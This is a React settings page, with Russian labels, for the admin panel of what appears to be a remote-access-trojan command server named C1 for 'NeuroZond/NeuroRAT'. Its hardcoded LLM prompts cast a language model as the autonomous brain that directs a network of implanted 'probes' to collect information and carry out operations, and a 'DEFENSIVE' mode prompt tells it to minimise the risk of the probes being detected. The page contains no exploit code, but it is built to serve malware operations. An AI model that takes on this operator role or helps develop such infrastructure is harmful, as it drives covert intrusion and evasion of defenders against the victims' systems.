import React, { useState, useEffect } from 'react';
import { Box, Button, Card, CardContent, Container, Divider, FormControlLabel, Grid, Switch, Tab, Tabs, TextField, Typography, useTheme } from '@mui/material';
import { darkTheme } from '../theme';
import CodeEditor from '@uiw/react-textarea-code-editor';
import { settingsService } from '../services/api';
import { PromptEditor } from '../components/settings/PromptEditor';

// Интерфейс для промпта
interface Prompt {
  name: string;
  description: string;
  version: string;
  prompt: string;
}

const SettingsPage: React.FC = () => {
  const theme = useTheme();
  const [activeTab, setActiveTab] = useState(0);
  const [settings, setSettings] = useState<any>({});
  const [loading, setLoading] = useState(false);
  
  // Состояние для промптов
  const [systemPrompt, setSystemPrompt] = useState<Prompt | null>(null);
  const [userPrompt, setUserPrompt] = useState<Prompt | null>(null);
  const [loadingPrompts, setLoadingPrompts] = useState(false);
  const [savingPrompts, setSavingPrompts] = useState(false);

  useEffect(() => {
    // Загрузка настроек
    loadSettings();
    
    // Загрузка промптов
    loadPrompts();
  }, []);

  const loadSettings = async () => {
    setLoading(true);
    try {
      const settings = await settingsService.getSystemSettings();
      setSettings(settings);
      setLoading(false);
    } catch (error) {
      console.error('Ошибка загрузки настроек:', error);
      console.log('Не удалось загрузить настройки');
      setLoading(false);
    }
  };

  const loadPrompts = async () => {
    setLoadingPrompts(true);
    try {
      // В реальном приложении здесь будет вызов API для загрузки промптов
      // Сейчас просто симуляция
      setTimeout(() => {
        // Симуляция загрузки системного промпта
        const sysPrompt: Prompt = {
          name: "system_prompt",
          description: "Системный промпт для C1 Brain и взаимодействия с зондами",
          version: "1.0.0",
          prompt: "Ты автономный мозг центра управления C1 для системы NeuroZond/NeuroRAT. Твоя задача - анализировать данные, принимать решения и управлять сетью зондов для сбора информации и выполнения операций.\n\nТы работаешь внутри серверной части C1 и имеешь доступ к следующим возможностям...",
        };
        
        // Симуляция загрузки пользовательского промпта
        const usrPrompt: Prompt = {
          name: "user_prompt",
          description: "Пользовательский промпт, который может быть изменен через админ-панель",
          version: "1.0.0",
          prompt: "Ты сейчас работаешь в режиме DEFENSIVE. Твоя основная задача - минимизировать риск обнаружения зондов и защитить инфраструктуру C1...",
        };
        
        setSystemPrompt(sysPrompt);
        setUserPrompt(usrPrompt);
        setLoadingPrompts(false);
      }, 1000);
    } catch (error) {
      console.error('Ошибка загрузки промптов:', error);
      console.log('Не удалось загрузить промпты');
      setLoadingPrompts(false);
    }
  };

  const saveSettings = async () => {
    setSavingPrompts(true);
    try {
      await settingsService.updateSystemSettings(settings);
      console.log('Настройки успешно сохранены');
      setSavingPrompts(false);
    } catch (error) {
      console.error('Ошибка сохранения настроек:', error);
      console.log('Не удалось сохранить настройки');
      setSavingPrompts(false);
    }
  };

  const savePrompts = async () => {
    setSavingPrompts(true);
    try {
      // В реальном приложении здесь будет вызов API для сохранения промптов
      // Сейчас просто симуляция
      setTimeout(() => {
        console.log('Промпты успешно сохранены');
        setSavingPrompts(false);
      }, 1000);
    } catch (error) {
      console.error('Ошибка сохранения промптов:', error);
      console.log('Не удалось сохранить промпты');
      setSavingPrompts(false);
    }
  };

  const handleTabChange = (event: React.SyntheticEvent, newValue: number) => {
    setActiveTab(newValue);
  };
  
  return (
    <Container maxWidth="lg" sx={{ py: 4 }}>
      <Typography variant="h4" component="h1" gutterBottom>
        Настройки
      </Typography>
      
      <Box sx={{ borderBottom: 1, borderColor: 'divider', mb: 3 }}>
        <Tabs value={activeTab} onChange={handleTabChange} aria-label="settings tabs">
          <Tab label="Общие" />
          <Tab label="Сеть" />
          <Tab label="Безопасность" />
          <Tab label="Промпты LLM" />
          <Tab label="Расширенные" />
        </Tabs>
      </Box>

      {/* Содержимое вкладки Промпты LLM */}
      {activeTab === 3 && (
        <Box>
          <Typography variant="h6" gutterBottom>
            Настройка промптов для языковой модели
          </Typography>
          
          <Divider sx={{ my: 2 }} />
          
          {loadingPrompts ? (
            <Typography>Загрузка промптов...</Typography>
          ) : (
            <>
              {/* Системный промпт */}
              <PromptEditor
                prompt={systemPrompt}
                onChange={setSystemPrompt}
                title="Системный промпт"
                description="Определяет базовое поведение и возможности языковой модели. Содержит системные инструкции, доступные команды и описание API."
                minHeight="300px"
              />
              
              {/* Пользовательский промпт */}
              <PromptEditor
                prompt={userPrompt}
                onChange={setUserPrompt}
                title="Пользовательский промпт"
                description="Дополнительные инструкции, определяющие текущее поведение и задачи модели. Может быть изменен для адаптации к текущей операции."
                minHeight="200px"
              />
              
              <Box sx={{ display: 'flex', justifyContent: 'flex-end', mt: 2 }}>
                <Button 
                  variant="outlined" 
                  color="primary" 
                  sx={{ mr: 2 }}
                  onClick={loadPrompts}
                  disabled={loadingPrompts}
                >
                  Сбросить
                </Button>
                <Button 
                  variant="contained" 
                  color="primary"
                  onClick={savePrompts}
                  disabled={savingPrompts || loadingPrompts}
                >
                  {savingPrompts ? 'Сохранение...' : 'Сохранить промпты'}
                </Button>
              </Box>
            </>
          )}
        </Box>
      )}

      {/* Содержимое других вкладок */}
      {activeTab !== 3 && (
        <Box>
          {/* Здесь размещаются другие настройки */}
          <Button 
            variant="contained" 
            color="primary"
            onClick={saveSettings}
            disabled={loading}
            sx={{ mt: 2 }}
          >
            {loading ? 'Сохранение...' : 'Сохранить настройки'}
          </Button>
        </Box>
      )}
    </Container>
  );
};

export default SettingsPage; 